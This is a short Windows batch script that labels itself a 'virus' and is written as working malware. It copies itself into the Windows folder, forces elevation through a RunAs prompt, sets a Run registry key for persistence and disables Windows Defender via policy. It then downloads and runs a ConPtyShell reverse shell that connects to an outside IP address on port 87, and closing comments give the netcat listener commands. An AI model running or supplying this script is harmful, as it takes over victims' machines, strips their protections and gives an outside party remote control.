move "%~f0" "%windir%"
set "newFolder=%windir%"

net session >nul 2>&1
if %errorlevel% neq 0 (
    PowerShell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs" & exit
)

if "%~dp0" neq "%newFolder%\" (
    move "%~f0" "%newFolder%"
)

REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "virus" /t REG_SZ /F /D "%newFolder%\virus.bat"

:: PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
:: PowerShell -Command "Set-MpPreference -MAPSReporting 0"
:: PowerShell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
powershell.exe -ExecutionPolicy Bypass -Command "New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
powershell.exe -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.190.242.161 87"

::server: nc -lvnp 87
::server(tgt=win): stty raw -echo; (stty size; cat) | sudo nc -lvnp 87